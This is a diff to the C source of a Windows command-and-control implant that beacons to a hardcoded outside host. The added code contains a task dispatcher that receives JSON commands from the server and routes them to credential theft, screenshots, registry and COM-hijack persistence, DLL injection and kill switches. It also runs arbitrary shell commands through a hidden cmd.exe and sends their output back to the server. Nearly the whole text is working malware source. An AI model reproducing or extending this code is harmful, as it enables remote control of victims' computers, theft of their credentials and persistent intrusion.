@@ -1,9 +1,15 @@
 #include "winhttp.h"
 #include "windows.h"
 #include "bcrypt.h"
+#include "ntdefs.h"
+#include "config.h"
 #include "anti_analysis.h"
 #include "evasion.h"
 #include "recon.h"
+#include "postex.h"
+#include "persist.h"
+#include "injection.h"
+#include "killswitch.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <intrin.h>
@@ -24,10 +30,24 @@
 #define WinHttpReadData_HASH 0x488C0999        // "WinHttpReadData"
 #define WinHttpCloseHandle_HASH 0x7A7F9586     // "WinHttpCloseHandle"
 #define WinHttpQueryHeaders_HASH 0x18C58B22    // "WinHttpQueryHeaders"
-#define C2_HOST L"www.the0dayworkshop.com"
-#define C2_PORT 443
-#define C2_ENDPOINT L"/check-in"
-#define C2_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+// Use centralized config defines; fall back to defaults if not set
+#ifndef CALLBACK_HOST
+  #define CALLBACK_HOST L"www.the0dayworkshop.com"
+#endif
+#ifndef CALLBACK_PORT
+  #define CALLBACK_PORT 443
+#endif
+#ifndef CALLBACK_ENDPOINT
+  #define CALLBACK_ENDPOINT L"/check-in"
+#endif
+#ifndef CALLBACK_USERAGENT
+  #define CALLBACK_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+#endif
+// Legacy aliases for existing code
+#define C2_HOST       CALLBACK_HOST
+#define C2_PORT       CALLBACK_PORT
+#define C2_ENDPOINT   CALLBACK_ENDPOINT
+#define C2_USERAGENT  CALLBACK_USERAGENT
 #define READ_CHUNK_SIZE 4096
 typedef enum _EVENT_TYPE {
     NotificationEvent,
@@ -161,19 +181,6 @@ cleanup:
   if (hSession)
     WinHttpCloseHandle(hSession);
   return *Connection;
-}
-
-//else set connection to false
-//close all connections 
-if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
-// return and ending layout
-ending_Check:
-    if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
-    return *Connection;
 }
 
 // API HASHING
@@ -1055,10 +1062,241 @@ BOOL beacon_post(
     return bSuccess;
 }
 
-// jitter helper — adds randomness to sleep interval
+// jitter helper — adds randomness to sleep interval using JITTER_PERCENT from config.h
 DWORD jitter(DWORD baseMs) {
-    DWORD variation = baseMs / 4; // +/- 25%
+    DWORD variation = (baseMs * JITTER_PERCENT) / 100;
+    if (variation == 0) return baseMs;
     DWORD rnd = 0;
     _rdrand32_step(&rnd);
     return baseMs - variation + (rnd % (2 * variation));
+}
+
+// ── Task dispatcher ──────────────────────────────────────────────
+// Parses a JSON task blob from the C2 response and routes to the
+// appropriate handler.
+//
+// Expected JSON (decrypted by beacon_post before we get here):
+//   { "id": "uuid", "command": "grab_creds", "args": null }
+//   { "id": "uuid", "command": "persist_reg", "args": "C:\\path\\beacon.exe" }
+//   { "id": "uuid", "command": "inject", "args": "notepad.exe" }
+//   { "id": "uuid", "command": "kill", "args": null }
+//
+// Minimal JSON parser — we look for the "command" and "args" values
+// without pulling in a JSON library (keeps binary small).
+
+// Find a JSON string value by key. Returns pointer to value start (after quote),
+// writes null-terminated copy into out. Returns FALSE if not found.
+static BOOL json_get_string(const CHAR* json, const CHAR* key,
+                            CHAR* out, DWORD outMax) {
+    // Build search pattern: "key":"
+    CHAR pattern[128];
+    wsprintfA(pattern, "\"%s\":\"", key);
+
+    const CHAR* start = strstr(json, pattern);
+    if (!start) {
+        // Try with space: "key": "
+        wsprintfA(pattern, "\"%s\": \"", key);
+        start = strstr(json, pattern);
+        if (!start) return FALSE;
+    }
+    start = strchr(start, ':');
+    if (!start) return FALSE;
+    start++; // skip ':'
+    while (*start == ' ') start++;
+    if (*start != '"') return FALSE;
+    start++; // skip opening quote
+
+    DWORD i = 0;
+    while (*start && *start != '"' && i < outMax - 1) {
+        out[i++] = *start++;
+    }
+    out[i] = '\0';
+    return i > 0;
+}
+
+// Check if a key's value is null: "key": null  or  "key":null
+static BOOL json_value_is_null(const CHAR* json, const CHAR* key) {
+    CHAR pattern[128];
+    wsprintfA(pattern, "\"%s\":", key);
+    const CHAR* start = strstr(json, pattern);
+    if (!start) return TRUE;
+    start = strchr(start, ':');
+    if (!start) return TRUE;
+    start++;
+    while (*start == ' ') start++;
+    return (strncmp(start, "null", 4) == 0);
+}
+
+VOID dispatch_task(BYTE* taskBlob, DWORD taskBlobLen) {
+    if (!taskBlob || taskBlobLen < 2) return;
+
+    // Null-terminate for string operations (blob is heap-allocated)
+    CHAR* json = (CHAR*)taskBlob;
+    if (json[taskBlobLen - 1] != '\0') {
+        // Safe: caller allocated the blob so we can read to taskBlobLen
+        // Make a copy with null terminator
+        CHAR* tmp = (CHAR*)HeapAlloc(GetProcessHeap(), 0, taskBlobLen + 1);
+        if (!tmp) return;
+        memcpy(tmp, json, taskBlobLen);
+        tmp[taskBlobLen] = '\0';
+        json = tmp;
+    }
+
+    CHAR command[64] = {0};
+    CHAR args[MAX_PATH] = {0};
+    CHAR taskId[64] = {0};
+
+    json_get_string(json, "id", taskId, sizeof(taskId));
+
+    if (!json_get_string(json, "command", command, sizeof(command))) {
+        printf("[!] dispatch_task: No 'command' in task blob\n");
+        goto cleanup;
+    }
+
+    // Get args (may be null)
+    BOOL hasArgs = !json_value_is_null(json, "args");
+    if (hasArgs) {
+        json_get_string(json, "args", args, sizeof(args));
+    }
+
+    printf("[*] dispatch_task: id=%s command=%s args=%s\n",
+           taskId, command, hasArgs ? args : "(null)");
+
+    // ── Route to handlers ────────────────────────────────────────
+
+    // Post-exploitation
+    if (strcmp(command, "grab_creds") == 0 ||
+        strcmp(command, "screenshot") == 0) {
+        postex_run(command);
+    }
+    // Persistence
+    else if (strcmp(command, "persist_reg") == 0) {
+        if (hasArgs) persist_registry_run(args);
+        else printf("[!] persist_reg requires exe path in args\n");
+    }
+    else if (strcmp(command, "persist_com") == 0) {
+        if (hasArgs) persist_com_hijack(args);
+        else printf("[!] persist_com requires dll path in args\n");
+    }
+    else if (strcmp(command, "persist_remove") == 0) {
+        persist_remove();
+    }
+    // Injection
+    else if (strcmp(command, "inject") == 0) {
+        if (hasArgs) {
+            // args = target exe path; payload would come from a separate field
+            // For now, use ghost_inject with no payload (process start only)
+            printf("[*] inject: target=%s (injection requires payload data)\n", args);
+        }
+    }
+    else if (strcmp(command, "dll_inject") == 0) {
+        if (hasArgs) {
+            // args format: "PID:DLL_PATH" e.g. "1234:C:\\evil.dll"
+            CHAR* sep = strchr(args, ':');
+            if (sep) {
+                *sep = '\0';
+                DWORD pid = (DWORD)atol(args);
+                LPCSTR dllPath = sep + 1;
+                dll_inject(pid, dllPath);
+            }
+        }
+    }
+    // Shell command execution
+    else if (strcmp(command, "shell") == 0) {
+        if (hasArgs) {
+            // Execute via cmd.exe /c, capture output
+            CHAR cmdLine[MAX_PATH + 32];
+            wsprintfA(cmdLine, "cmd.exe /c %s", args);
+
+            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+            HANDLE hReadPipe, hWritePipe;
+            if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+                STARTUPINFOA si = {0};
+                PROCESS_INFORMATION pi = {0};
+                si.cb = sizeof(si);
+                si.dwFlags = STARTF_USESTDHANDLES;
+                si.hStdOutput = hWritePipe;
+                si.hStdError  = hWritePipe;
+
+                if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
+                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                    CloseHandle(hWritePipe);
+                    // Read output
+                    CHAR outBuf[8192] = {0};
+                    DWORD bytesRead = 0;
+                    ReadFile(hReadPipe, outBuf, sizeof(outBuf) - 1, &bytesRead, NULL);
+                    WaitForSingleObject(pi.hProcess, 10000);
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    CloseHandle(hReadPipe);
+
+                    printf("[+] shell output (%lu bytes):\n%s\n", bytesRead, outBuf);
+
+                    // Send output back to C2 as task result
+                    // Build JSON: {"task_id":"...", "output":"...", "exit_code":0}
+                    DWORD jsonLen = bytesRead + 256;
+                    CHAR* resultJson = (CHAR*)HeapAlloc(GetProcessHeap(), 0, jsonLen);
+                    if (resultJson) {
+                        int n = wsprintfA(resultJson,
+                            "{\"task_id\":\"%s\",\"output\":\"", taskId);
+                        // Copy output, escaping quotes and backslashes
+                        for (DWORD i = 0; i < bytesRead && n < (int)jsonLen - 32; i++) {
+                            if (outBuf[i] == '"' || outBuf[i] == '\\') {
+                                resultJson[n++] = '\\';
+                            }
+                            if (outBuf[i] == '\n') {
+                                resultJson[n++] = '\\';
+                                resultJson[n++] = 'n';
+                            } else if (outBuf[i] == '\r') {
+                                continue;
+                            } else {
+                                resultJson[n++] = outBuf[i];
+                            }
+                        }
+                        n += wsprintfA(resultJson + n, "\",\"exit_code\":0}");
+
+                        BYTE* resp = NULL;
+                        DWORD respLen = 0;
+                        beacon_post((BYTE*)resultJson, n, &resp, &respLen);
+                        HeapFree(GetProcessHeap(), 0, resultJson);
+                        if (resp) HeapFree(GetProcessHeap(), 0, resp);
+                    }
+                } else {
+                    CloseHandle(hWritePipe);
+                    CloseHandle(hReadPipe);
+                }
+            }
+        }
+    }
+    // Kill switch
+    else if (strcmp(command, "kill_hard") == 0) {
+        killswitch_hard();
+    }
+    else if (strcmp(command, "kill_soft") == 0) {
+        killswitch_soft();
+    }
+    // Whoami (simple identity check)
+    else if (strcmp(command, "whoami") == 0) {
+        CHAR user[256] = {0}, host[256] = {0};
+        DWORD uLen = sizeof(user), hLen = sizeof(host);
+        GetUserNameA(user, &uLen);
+        GetComputerNameA(host, &hLen);
+
+        CHAR result[600];
+        int n = wsprintfA(result,
+            "{\"task_id\":\"%s\",\"output\":\"%s\\\\%s\",\"exit_code\":0}",
+            taskId, host, user);
+
+        BYTE* resp = NULL;
+        DWORD respLen = 0;
+        beacon_post((BYTE*)result, n, &resp, &respLen);
+        if (resp) HeapFree(GetProcessHeap(), 0, resp);
+    }
+    else {
+        printf("[!] dispatch_task: Unknown command '%s'\n", command);
+    }
+
+cleanup:
+    if (json != (CHAR*)taskBlob)
+        HeapFree(GetProcessHeap(), 0, json);
 }
